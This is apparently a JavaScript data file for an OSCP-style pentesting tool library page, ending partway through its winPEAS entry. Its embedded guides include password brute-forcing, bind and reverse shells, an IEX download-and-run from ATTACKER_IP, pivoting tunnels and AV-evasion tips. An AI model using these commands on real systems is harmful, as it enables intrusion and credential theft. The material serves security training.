/* ==============================================================
   TOOL LIBRARY SCRIPT – ALL DATA IN ONE BLOCK
   ============================================================== */
document.addEventListener('DOMContentLoaded', function () {
  /* ----------   ELEMENTS   ---------- */
  const loader    = document.getElementById('loader');
  const app       = document.getElementById('app');
  const modal     = document.getElementById('infoModal');
  const closeBtn  = document.querySelector('.modal-close');
  const container = document.getElementById('container');

  /* ----------   MODAL HANDLERS   ---------- */
  if (closeBtn) closeBtn.addEventListener('click', () => { modal.style.display = 'none'; });
  window.addEventListener('click', e => { if (e.target === modal) modal.style.display = 'none'; });
  window.addEventListener('keydown', e => { if (e.key === 'Escape' && modal.style.display === 'block') modal.style.display = 'none'; });

  /* ----------   GLOBAL HELPERS   ---------- */
  const toolLookup = {};   // id → tool object
  let toolIdCounter = 0;

  /* 1️⃣  Make the two functions global so inline `onclick="..."` works */
  function showInfo(toolId) {
    const tool = toolLookup[toolId];
    if (!tool) return;
    document.getElementById('modalTitle').textContent     = tool.name;
    document.getElementById('modalDescription').innerHTML = tool.detail;
    modal.style.display = 'block';
  }
  window.showInfo = showInfo;

  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  /* 2️⃣  Correct download path and guard against missing file name */
  function downloadTool(filename) {
    if (!filename) return;                                 // no file → nothing to download
    const clean = filename.replace(/^\/+/, '');             // strip leading '/'
    const filePath = `./tools/${clean}`;                   // relative
    const link = document.createElement('a');
    link.href = filePath;
    link.download = clean;
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }
  window.downloadTool = downloadTool;

  /* ----------   DATA   ---------- */
  const data = [
    {
      name: "01_recon_enum — Reconnaissance & Enumeration",
      tools: [
        {
          cat: "wordlists/",
          items: [
            {
              name: "TEST",
              desc: "Large general-purpose wordlist",
              file: "/tools/big.txt",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is big.txt?</div>
                <p>A massive, general-purpose wordlist containing ~20,000+ common directory, file, and subdomain names. Originally from the <strong>DirBuster</strong> project. Ideal when you don’t know what you’re looking for.</p>

                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Early recon when no other wordlist is working</li>
                  <li>Brute‑forcing directories on unknown web apps</li>
                  <li>Finding hidden config files, backups, admin panels</li>
                  <li>Subdomain brute‑forcing as a last resort</li>
                </ul>

                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;"># Directory brute‑forcing with ffuf
ffuf -u https://target.com/FUZZ -w big.txt -fc 404

# With gobuster
gobuster dir -u https://target.com -w big.txt -x php,html,txt

# Subdomain brute‑forcing
ffuf -u https://FUZZ.target.com -w big.txt -H "Host: FUZZ.target.com" -fs 0</pre>

                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Too slow? Filter by status code: <code>-fc 404,403</code></li>
                  <li>Combine with <code>-x</code> to test extensions: <code>php,aspx,js</code></li>
                  <li>Use with rate limiting: <code>-p 0.1</code> to avoid blocking</li>
                  <li>Not finding anything? Try <code>raft‑large‑directories.txt</code> or <code>directory‑list‑2.3‑big.txt</code></li>
                </ul>
              `,
              tags: ["wordlist", "bruteforce", "directories", "fallback", "general", "ffuf", "gobuster"],
              phase: "01_recon_enum"
            },
            {
              name: "common‑snmp‑community‑strings‑onesixtyone.txt",
              desc: "Common SNMP community strings",
              file: "common-snmp-community-strings-onesixtyone.txt",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is this?</div>
                <p>List of commonly used SNMP community strings (like public, private, admin) used to brute‑force SNMP services.</p>

                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When scanning for SNMP services (UDP 161)</li>
                  <li>To extract system info, routing tables, ARP cache</li>
                  <li>For network mapping and device enumeration</li>
                </ul>

                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;"># With onesixtyone
onesixtyone -c common-snmp-community-strings-onesixtyone.txt 10.10.10.10

# With snmpwalk
snmpwalk -c public -v1 10.10.10.10

# Extract system info
snmpwalk -c public -v1 10.10.10.10 system</pre>

                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Try both v1 and v2c: <code>-v1</code> and <code>-v2c</code></li>
                  <li>Look for <code>hrSWRun</code> to find running processes</li>
                  <li>Check <code>ifTable</code> for network interfaces</li>
                  <li>Use <code>snmp-check</code> for automated enumeration</li>
                </ul>
              `,
              tags: ["snmp", "bruteforce", "network", "enumeration", "community strings", "onesixtyone", "snmpwalk"],
              phase: "01_recon_enum"
            },
            {
              name: "common.txt",
              desc: "Common directory & file names",
              file: "common.txt",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is common.txt?</div>
                <p>Short, curated list of the most common web paths (e.g., /admin, /login, /config). Fast for quick scans.</p>

                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Quick initial scan on web apps</li>
                  <li>When you need fast results (CTF or time‑limited)</li>
                  <li>Before using larger wordlists like big.txt</li>
                </ul>

                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Quick scan with ffuf
ffuf -u https://target.com/FUZZ -w common.txt -fc 404 -t 50

# With dirsearch
dirsearch -u https://target.com -w common.txt -e php,html

# Check for common files
ffuf -u https://target.com/FUZZ -w common.txt -fc 404 -mc 200,301,302</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Combine with <code>-e</code> for extensions: <code>php,aspx,js,txt</code></li>
                  <li>Use <code>-t 100</code> for faster scans (if server allows)</li>
                  <li>Filter by response size: <code>-fs 0</code> to ignore empty responses</li>
                  <li>Always check <code>/robots.txt</code> and <code>/.git/</code> manually</li>
                </ul>
              `,
              tags: ["wordlist", "web", "fast", "common paths", "quick enum", "ffuf", "dirsearch"],
              phase: "01_recon_enum"
            },
            {
              name: "directory‑list‑2.3‑medium.txt",
              desc: "Medium‑sized directory brute‑force list",
              file: "directory-list-2.3-medium.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is this?</div>
                <p>Medium‑sized, well‑known directory brute‑force list from the DirBuster project. Balanced between speed and coverage.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When common.txt returns nothing</li>
                  <li>For comprehensive web app enumeration</li>
                  <li>OSCP staple — often finds hidden directories</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Standard usage
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -fc 404 -t 50

# With extensions
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -fc 404 -e .php,.html,.txt

# Recursive scan
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -fc 404 -recursion -recursion-depth 2</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>-recursion</code> to find nested directories</li>
                  <li>Filter by word count: <code>-fw 5</code> to ignore common error pages</li>
                  <li>Save results: <code>-o results.json</code></li>
                  <li>For OSCP: This list often finds /admin, /backup, /dev, /test</li>
                </ul>
              `,
              tags: ["wordlist", "dirbuster", "web enum", "medium", "oscp staple", "ffuf", "recursive"],
              phase: "01_recon_enum"
            },
            {
              name: "raft‑medium‑files.txt",
              desc: "RAFT list — medium file names",
              file: "raft-medium-files.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is RAFT?</div>
                <p>From the RAFT project — focused on file names (not directories), e.g., backup.zip, config.php, test.aspx.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you suspect backup or config files exist</li>
                  <li>After finding a directory — brute‑force files inside</li>
                  <li>For source code exposure or credential leaks</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# File brute‑forcing
ffuf -u https://target.com/FUZZ -w raft-medium-files.txt -fc 404

# In a specific directory
ffuf -u https://target.com/admin/FUZZ -w raft-medium-files.txt -fc 404

# With multiple extensions
ffuf -u https://target.com/FUZZ -w raft-medium-files.txt -fc 404 -e .bak,.old,.zip,.tar.gz</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Look for <code>.bak</code>, <code>.old</code>, <code>~</code> files — often contain source code</li>
                  <li>Try <code>web.config.bak</code>, <code>wp-config.php.bak</code>, <code>.git/config</code></li>
                  <li>Combine with <code>gobuster</code> for directory + file brute‑forcing</li>
                  <li>Check for <code>composer.lock</code>, <code>package.json</code> for version info</li>
                </ul>
              `,
              tags: ["wordlist", "files", "raft", "backup files", "source exposure", "ffuf", "gobuster"],
              phase: "01_recon_enum"
            },
            {
              name: "rockyou.txt.gz",
              desc: "Famous password list (compressed)",
              file: "rockyou.txt.gz",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is rockyou.txt?</div>
                <p>Legendary password wordlist from the RockYou breach (2009). Contains 14+ million real‑world passwords. Compressed to save space.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>For password spraying against login forms</li>
                  <li>Cracking hashes (NTLM, MD5, SHA1)</li>
                  <li>Brute‑forcing SSH, FTP, SMB, databases</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Decompress first
gunzip rockyou.txt.gz

# Crack hashes with hashcat
hashcat -m 1000 hashes.txt rockyou.txt

# With hydra for SSH
hydra -l admin -P rockyou.txt ssh://10.10.10.10

# For web login forms
ffuf -u https://target.com/login -X POST -d "username=admin&password=FUZZ" -w rockyou.txt -fc 401</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Sort by frequency: <code>sort rockyou.txt | uniq -c | sort -nr</code></li>
                  <li>Use first 1000 lines for quick spray: <code>head -1000 rockyou.txt > quick.txt</code></li>
                  <li>Combine with username list for credential stuffing</li>
                  <li>For OSCP: Often works with default creds like admin:admin, root:123456</li>
                </ul>
              `,
              tags: ["passwords", "rockyou", "cracking", "bruteforce", "credential attack", "hashcat", "hydra"],
              phase: "02_initial_access"
            },
            {
              name: "subdomains‑top1million‑20000.txt",
              desc: "Top 20K subdomains for enumeration",
              file: "subdomains-top1million-20000.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is this?</div>
                <p>Top 20,000 most common subdomains (e.g., www, mail, dev, api, staging) from public DNS data.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Subdomain brute‑forcing for vhost enumeration</li>
                  <li>Finding development, staging, or admin subdomains</li>
                  <li>Expanding attack surface on web apps</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# With ffuf
ffuf -u https://FUZZ.target.com -w subdomains-top1million-20000.txt -H "Host: FUZZ.target.com" -fs 0

# With gobuster
gobuster vhost -u https://target.com -w subdomains-top1million-20000.txt

# Check for HTTPS
ffuf -u https://FUZZ.target.com -w subdomains-top1million-20000.txt -k</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Always add <code>dev, test, staging, admin, internal, api</code> manually</li>
                  <li>Use <code>-k</code> to ignore SSL errors</li>
                  <li>Check for different HTTP status codes: <code>-mc 200,301,302,403</code></li>
                  <li>Combine with DNS enumeration tools like <code>dnsrecon</code> or <code>sublist3r</code></li>
                </ul>
              `,
              tags: ["subdomains", "dns", "vhost", "bruteforce", "recon", "ffuf", "gobuster"],
              phase: "01_recon_enum"
            },
            {
              name: "xato-net-10-million-usernames.txt",
              desc: "10M common usernames for brute‑force",
              file: "xato-net-10-million-usernames.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is this?</div>
                <p>List of 10 million commonly used usernames (e.g., admin, test, user1, backup, svc_apache).</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Username enumeration on login forms</li>
                  <li>Kerberos AS‑REP roasting (GetNPUsers.py)</li>
                  <li>Password spraying attacks</li>
                  <li>SSH, SMB, database brute‑forcing</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Kerberos AS‑REP roast
GetNPUsers.py -no-pass -usersfile xato-net-10-million-usernames.txt corp.local/

# SSH brute‑force with hydra
hydra -L xato-net-10-million-usernames.txt -p 'Password123' ssh://10.10.10.10

# Web login form
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=Password123" -w xato-net-10-million-usernames.txt -fc 401</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use top 1000: <code>head -1000 xato-net-10-million-usernames.txt > top1000.txt</code></li>
                  <li>Look for service accounts: <code>svc_, adm_, backup_, sql_</code></li>
                  <li>Combine with <code>cewl</code> to generate usernames from website</li>
                  <li>For AD: Focus on <code>administrator, admin, guest, krbtgt</code></li>
                </ul>
              `,
              tags: ["usernames", "spraying", "kerberos", "enum", "credential", "hydra", "impacket"],
              phase: "01_recon_enum"
            }
          ]
        },
        {
          cat: "network_utilities/",
          items: [
            {
              name: "ncat",
              desc: "Quick shell connections",
              file: "ncat",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is ncat?</div>
                <p>Modern Netcat from Nmap project — supports SSL, proxy, IPv6, and connection brokering.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Quick reverse/bind shells</li>
                  <li>Port scanning and banner grabbing</li>
                  <li>File transfer between machines</li>
                  <li>Proxying or relaying connections</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Reverse shell listener
ncat -lvnp 4444

# Bind shell
ncat -lvnp 4444 -e /bin/bash

# File transfer
# Receiver: ncat -lvnp 4444 > file.txt
# Sender: ncat 10.10.10.10 4444 < file.txt

# SSL encrypted shell
ncat --ssl -lvnp 4444</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--exec</code> instead of <code>-e</code> for newer versions</li>
                  <li>Add <code>--keep-open</code> to handle multiple connections</li>
                  <li>For OSCP: Often allowed where netcat is blocked</li>
                  <li>Use <code>--sh-exec</code> to execute shell commands</li>
                </ul>
              `,
              tags: ["netcat", "shell", "transfer", "tunnel", "nc", "reverse shell", "bind shell"],
              phase: "01_recon_enum"
            },
            {
              name: "chisel.zip",
              desc: "Port forwarding / pivoting",
              file: "chisel.zip",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is chisel?</div>
                <p>A fast, encrypted TCP/UDP tunnel over HTTP(S). Create SOCKS proxies or port forwards through firewalls. Essential for pivoting in internal networks.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you compromise a machine inside a network</li>
                  <li>To access internal services (SMB, RDP, databases)</li>
                  <li>To route tools like nmap, bloodhound, or metasploit through the pivot</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# On your attacking machine (server)
./chisel server -p 8080 --reverse

# On compromised target (client)
./chisel client YOUR_IP:8080 R:socks

# Now set proxychains
proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24

# Forward single port
./chisel client YOUR_IP:8080 R:3389:192.168.1.10:3389</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--auth user:pass</code> for extra security</li>
                  <li>Works over HTTP — often bypasses egress filters</li>
                  <li>For OSCP: SOCKS proxy + proxychains is your best friend</li>
                  <li>If blocked, try DNS or ICMP tunneling alternatives</li>
                </ul>
              `,
              tags: ["tunnel", "pivot", "socks", "proxy", "firewall bypass", "proxychains", "chisel"],
              phase: "01_recon_enum"
            },
            {
              name: "ligolo.zip",
              desc: "Lateral movement proxy",
              file: "ligolo.zip",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is ligolo?</div>
                <p>Lightweight, reverse tunneling tool for lateral movement. Creates encrypted tunnels for proxying traffic.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you need a lightweight alternative to chisel</li>
                  <li>For tunneling in restricted environments</li>
                  <li>When you want minimal footprint on target</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Start proxy server on attacker
./proxyserver -selfcert

# On target, connect back
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In proxy server, start tunnel
start

# Set up route
route add 192.168.1.0/24

# Use with proxychains
proxychains nmap -sT -Pn -n 192.168.1.10</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--ignore-cert</code> to avoid certificate errors</li>
                  <li>Ligolo-ng is the newer version — more features</li>
                  <li>Supports ICMP and DNS tunneling modes</li>
                  <li>Great for OSCP when chisel is detected</li>
                </ul>
              `,
              tags: ["pivot", "tunnel", "proxy", "lateral movement", "ligolo-ng", "proxychains"],
              phase: "01_recon_enum"
            },
            {
              name: "PowerCat.ps1",
              desc: "PowerShell netcat",
              file: "PowerCat.ps1",
              dup: "from 01_recon_enum",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is PowerCat?</div>
                <p>PowerShell implementation of Netcat. Can listen, connect, transfer files, and execute commands.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When netcat is not available on Windows</li>
                  <li>For AV evasion (PowerShell is often allowed)</li>
                  <li>File transfer in restricted environments</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Load in memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerCat.ps1')

# Reverse shell
powercat -c ATTACKER_IP -p 4444 -e cmd

# Bind shell
powercat -l -p 4444 -e cmd

# File transfer (receiver)
powercat -l -p 4444 -of received_file.txt

# File transfer (sender)
powercat -c ATTACKER_IP -p 4444 -i file_to_send.txt</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>-g</code> to generate a script for persistence</li>
                  <li>Combine with <code>Invoke-Obfuscation</code> to evade AV</li>
                  <li>For OSCP: Essential when you get RCE but no netcat</li>
                  <li>Use <code>-dns</code> mode for DNS tunneling if HTTP is blocked</li>
                </ul>
              `,
              tags: ["powershell", "netcat", "reverse shell", "windows", "av evasion", "file transfer"],
              phase: "01_recon_enum"
            },
            {
              name: "PortKnocker.sh",
              desc: "Port knocking script",
              file: "PortKnocker.sh",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is PortKnocker.sh?</div>
                <p>Bash script to perform port knocking — sending packets to closed ports in sequence to trigger hidden services.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When ports are filtered by firewall</li>
                  <li>To discover hidden SSH or other services</li>
                  <li>CTF challenges with port knocking</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Basic usage
./PortKnocker.sh -h 10.10.10.10 -p 1000,2000,3000

# With delay between knocks
./PortKnocker.sh -h 10.10.10.10 -p 1000,2000,3000 -d 500

# TCP and UDP mixed
./PortKnocker.sh -h 10.10.10.10 -p T:1000,U:2000,T:3000</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>nmap --script knock</code> as alternative</li>
                  <li>Try common sequences: 1000,2000,3000 or 7000,8000,9000</li>
                  <li>Check for new open ports after knocking</li>
                  <li>For OSCP: Rare but has appeared in retired machines</li>
                </ul>
              `,
              tags: ["port knocking", "stealth", "access", "script", "covert", "nmap", "firewall"],
              phase: "01_recon_enum"
            },
            {
              name: "windapsearch.py",
              desc: "LDAP enumeration",
              file: "windapsearch.py",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is windapsearch.py?</div>
                <p>Python script to enumerate Active Directory via LDAP queries — users, groups, computers, SPNs.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you have LDAP access (port 389/636)</li>
                  <li>To enumerate AD without PowerShell</li>
                  <li>When PowerView is blocked</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Enumerate users
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --users

# Enumerate groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --groups

# Find computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --computers

# Get SPNs for kerberoasting
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --spns</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--da</code> to find Domain Admins</li>
                  <li>Try <code>--search-user</code> for specific user info</li>
                  <li>Output to file: <code>> users.txt</code></li>
                  <li>For OSCP: Great when you get low‑priv AD account</li>
                </ul>
              `,
              tags: ["ldap", "ad enum", "python", "lightweight", "enumeration", "kerberoast"],
              phase: "01_recon_enum"
            },
            {
              name: "linpeas.sh",
              desc: "Linux privilege enumeration",
              file: "linpeas.sh",
              dup: "from 04/linux",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is linpeas.sh?</div>
                <p><strong>LinPEAS</strong> is the ultimate Linux privilege escalation script. It automates the discovery of misconfigurations, credentials, services, and known exploits.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>After gaining initial access to a Linux box</li>
                  <li>When you need to elevate from low‑priv user to root</li>
                  <li>To find passwords, keys, tokens, or misconfigured services</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Download and run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload and execute
chmod +x linpeas.sh
./linpeas.sh

# Quiet mode (less noise)
./linpeas.sh -q

# Output to file
./linpeas.sh > /tmp/linpeas.out</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Look for <span style="color:#ff6b6b;">RED</span> and <span style="color:#ffd700;">YELLOW</span> highlights — they indicate critical findings</li>
                  <li>Check for SUID binaries, writable cron jobs, docker escape vectors</li>
                  <li>Search for passwords: <code>./linpeas.sh | grep -i "password\|pwd"</code></li>
                  <li>Use <code>-a</code> for full audit (slower but more thorough)</li>
                </ul>
              `,
              tags: ["linux", "privesc", "enum", "automation", "peass", "privilege escalation"],
              phase: "01_recon_enum"
            },
            {
              name: "winpeasx64.exe",
              desc: "Windows enumeration tool",
              file: "winpeasx64.exe",
              dup: "from 04/windows",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is winpeasx64.exe?</div>
                <p>Windows Privilege Escalation Awesome Script — .exe version for easy execution on Windows targets.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
